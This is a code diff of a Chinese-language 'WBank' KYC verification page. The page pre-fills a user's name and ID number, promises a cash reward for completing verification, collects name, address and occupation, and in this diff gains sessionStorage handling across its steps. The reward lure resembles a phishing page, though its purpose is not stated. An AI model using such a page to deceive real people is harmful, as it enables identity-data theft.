@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>W Bank -- KYC驗證頁面</title>
+    <title>WBank -- KYC驗證頁面</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -69,7 +69,7 @@
         <div id="step1" class="step active">
             <p>你好 {{user}}, 你的身分證/證件號碼：{{id}} ，而且還需要進行進一步的驗證審查。</p>
             <p><b>現在完成KYC驗證後，送你WTC$20,000（約2,000港元）</b></p>
-            <form id="kycForm" action="/wbank/v1/kyc" method="post">
+            <form id="step1Form">
                 <div class="form-group">
                     <label for="user">用戶名：</label>
                     <input type="text" id="user" name="user" value="{{user}}" readonly>
@@ -85,7 +85,7 @@
         </div>
 
         <div id="step2" class="step">
-            <form id="kycForm" action="/wbank/v1/kyc" method="post">
+            <form id="step2Form">
                 <div class="form-group">
                     <label for="fname">全名：［中英文都可以］</label>
                     <input type="text" id="fname" name="fname" placeholder="Fullname" required>
@@ -106,7 +106,7 @@
         </div>
 
         <div id="step3" class="step">
-            <form id="kycForm" action="/wbank/v1/kyc" method="post">
+            <form id="step3Form" action="/wbank/v1/kyc" method="post">
                 <div class="form-group">
                     <input type="checkbox" id="terms1" name="terms1" required>
                     <label for="terms1">本人已知悉泓財銀行WBank 的相關條款。</label>
@@ -138,7 +138,24 @@
             document.getElementById(`step${step}`).classList.add('active');
         }
 
+        function saveStepData() {
+            sessionStorage.setItem('user', document.getElementById('user').value);
+            sessionStorage.setItem('id', document.getElementById('id').value);
+            sessionStorage.setItem('fname', document.getElementById('fname') ? document.getElementById('fname').value : '');
+            sessionStorage.setItem('address', document.getElementById('address') ? document.getElementById('address').value : '');
+            sessionStorage.setItem('career', document.getElementById('career') ? document.getElementById('career').value : '');
+        }
+
+        function loadStepData() {
+            document.getElementById('user').value = sessionStorage.getItem('user') || '';
+            document.getElementById('id').value = sessionStorage.getItem('id') || '';
+            document.getElementById('fname').value = sessionStorage.getItem('fname') || '';
+            document.getElementById('address').value = sessionStorage.getItem('address') || '';
+            document.getElementById('career').value = sessionStorage.getItem('career') || '';
+        }
+
         function nextStep() {
+            saveStepData();
             if (currentStep < totalSteps) {
                 currentStep++;
                 showStep(currentStep);
@@ -146,11 +163,18 @@
         }
 
         function prevStep() {
+            saveStepData();
             if (currentStep > 1) {
                 currentStep--;
                 showStep(currentStep);
             }
         }
+
+        document.getElementById('step3Form').addEventListener('submit', function() {
+            saveStepData();
+        });
+
+        window.onload = loadStepData;
     </script>
 </body>
 </html>
